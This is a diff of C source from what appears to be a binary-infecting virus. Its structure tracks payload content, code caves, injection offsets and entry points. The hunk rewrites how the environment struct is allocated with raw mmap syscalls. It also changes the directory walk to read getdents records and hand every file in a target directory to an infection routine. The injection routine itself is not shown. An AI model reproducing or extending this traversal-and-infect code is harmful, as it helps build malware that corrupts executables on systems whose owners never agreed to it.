@@ -9,54 +9,68 @@ void clear_env(t_env *env)
 	if (env->obj_name) {
 		syscall_munmap(env->obj_name, env->obj_name_size);
 	}
+	syscall_munmap(env, sizeof(t_env));
 }
 
-
-t_env env;
 t_env *set_env() {
-	env.obj = NULL;
-	env.obj_name = NULL;
-	env.obj_name_size = 0;
-	env.obj_cpy = NULL;
-	env.obj_size = 0;
-	env.new_obj_size = 0;
-	env.obj_base = 0;
-	env.payload_file = NULL;
-	env.payload_content = NULL;
-	env.payload_size = 0;
-	env.load_align = 0;
-	env.entrypoint = 0;
-	env.plt_offset = 0;
-	env.found_code_cave = 0;
-	env.found_code_cave_id = 0;
-	env.inject_offset = 0;
-	env.inject_addr = 0;
+	t_env *env;
+	if ((env = syscall_mmap(0, sizeof(t_env), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
+		return NULL;
+	}
+	ft_bzero(env, sizeof(t_env));
+	env->obj = NULL;
+	env->obj_name = NULL;
+	env->obj_name_size = 0;
+	env->obj_cpy = NULL;
+	env->obj_size = 0;
+	env->new_obj_size = 0;
+	env->obj_base = 0;
+	env->payload_file = NULL;
+	env->payload_content = NULL;
+	env->payload_size = 0;
+	env->load_align = 0;
+	env->entrypoint = 0;
+	env->plt_offset = 0;
+	env->found_code_cave = 0;
+	env->found_code_cave_id = 0;
+	env->inject_offset = 0;
+	env->inject_addr = 0;
 
-	return &env;
+	return env;
 }
 
 
 int listdir(char *target) {
 	int d;
-	struct dirent dir = {0};
-	
+	char buf[1024];
+	struct dirent *dir;
+	long nread = 0;
+	t_env *env;
+
+	if ((dir = syscall_mmap(0, sizeof(struct dirent), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
+		return -1;
+	}
 	d = syscall_openat(AT_FDCWD, target, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC);
 	if (d > 0) {
-		while (syscall_getdents(d, &dir, sizeof(struct dirent)) > 0) {
-			if (ft_strcmp(dir.d_name, ".") != 0 && ft_strcmp(dir.d_name, "..") != 0) {
-				t_env *env = NULL;
-				if ((env = set_env()) == NULL) {
-					return -1;
+		ft_bzero(dir, sizeof(struct dirent));
+		while ((nread = syscall_getdents(d, buf, 1024)) > 0) {
+			for (long bpos = 0; bpos < nread;) {
+				dir = (struct dirent *) (buf + bpos);
+				if (ft_strcmp(dir->d_name, ".") != 0 && ft_strcmp(dir->d_name, "..") != 0) {
+					if ((env = set_env()) == NULL) {
+						return -1;
+					}
+					env->obj_name_size = ft_strlen(target) + ft_strlen(dir->d_name) + 1;
+					if ((env->obj_name = syscall_mmap(0, env->obj_name_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
+						return -1;
+					}
+					ft_bzero(env->obj_name, env->obj_name_size);
+					ft_strcpy(env->obj_name, target);
+					ft_strcat(env->obj_name, dir->d_name);
+					read_obj(env);
+					clear_env(env);
 				}
-				env->obj_name_size = ft_strlen(target) + ft_strlen(dir.d_name) + 1;
-				if ((env->obj_name = syscall_mmap(0, env->obj_name_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
-					return -1;
-				}
-				ft_bzero(env->obj_name, env->obj_name_size);
-				ft_strcpy(env->obj_name, target);
-				ft_strcat(env->obj_name, dir.d_name);
-				read_obj(env);
-				clear_env(env);
+				bpos += dir->d_reclen;
 			}
 		}
 		syscall_close(d);
